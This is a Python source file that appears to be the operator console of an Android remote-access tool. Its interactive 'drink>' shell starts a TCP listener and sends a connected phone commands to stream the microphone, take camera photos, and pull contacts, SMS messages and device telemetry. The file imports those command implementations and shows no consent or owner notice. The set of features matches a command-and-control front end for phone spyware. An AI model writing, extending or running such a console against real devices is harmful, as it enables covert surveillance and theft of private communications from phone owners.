import asyncio
import os
import sys

from app.config import settings
from app.state import state
from app.tcp.commands import (
    cmd_disconnect,
    cmd_get_contacts,
    cmd_get_sms,
    cmd_get_telemetry,
    cmd_list_cams,
    cmd_stop_mic,
    cmd_use_cam,
    cmd_use_mic,
)
from app.tcp.server import start_tcp_server_action, stop_tcp_server_action


def print_help(post_start: bool = False, post_connect: bool = False) -> None:
    if not post_start:
        print("  start            start listening for TCP connections")
        print("  quit             exit")
        return
    if not post_connect:
        print("  stop             stop listening")
        print("  quit             exit")
        print("  (waiting for client...)")
        return
    print("  disconnect       disconnect the Android client")
    print("  use mic          start mic audio stream")
    print("  stop mic         stop mic audio stream")
    print("  get contacts     download contacts.zip to storage dir")
    print("  get sms [hours]  fetch SMS messages (default 24h)")
    print("  get telemetry    fetch device battery, network, storage, and specs")
    if settings.enable_camera:
        print("  list             list available cameras")
        print("  use cam <id>     capture photo from camera (e.g. use cam 0)")
    print("  stop             stop server and disconnect client")
    print("  quit             exit")
    print("  help             show this help")


async def shell_loop() -> None:
    loop = asyncio.get_running_loop()

    if not sys.stdin.isatty():
        await asyncio.Event().wait()
        return

    def read_line() -> str:
        try:
            sys.stdout.write("drink> ")
            sys.stdout.flush()
            return sys.stdin.readline()
        except Exception:
            return ""

    while True:
        raw = await loop.run_in_executor(None, read_line)
        if raw == "":
            await asyncio.Event().wait()
            return
        line = raw.strip()
        if not line:
            continue

        cmd = line.lstrip("/").strip()

        if cmd in ("quit", "exit"):
            print("bye.")
            os._exit(0)

        if cmd == "start":
            if state.listening:
                print("already listening")
            else:
                await start_tcp_server_action()
            continue

        if cmd == "stop":
            if not state.listening:
                print("not listening")
            else:
                await stop_tcp_server_action()
            continue

        if cmd == "disconnect":
            await cmd_disconnect()
            continue

        if cmd == "use mic":
            await cmd_use_mic()
            continue

        if cmd == "stop mic":
            await cmd_stop_mic()
            continue

        if cmd == "get contacts":
            await cmd_get_contacts()
            continue

        if cmd == "get sms" or cmd.startswith("get sms "):
            parts = cmd.split()
            hours = 24
            if len(parts) >= 3 and parts[2].isdigit():
                hours = int(parts[2])
            await cmd_get_sms(hours)
            continue

        if cmd in ("list", "list cams", "list cameras"):
            if not settings.enable_camera:
                print("camera feature is disabled")
            else:
                await cmd_list_cams()
            continue

        if cmd.startswith("use cam"):
            if not settings.enable_camera:
                print("camera feature is disabled")
            else:
                parts = cmd.split()
                cam_id = parts[2] if len(parts) >= 3 else "0"
                await cmd_use_cam(cam_id)
            continue

        if cmd in ("get telemetry", "telemetry"):
            await cmd_get_telemetry()
            continue

        if cmd == "help":
            print_help(state.listening, state.client_connected())
            continue

        print(f"unknown command: {line!r}  (type help)")
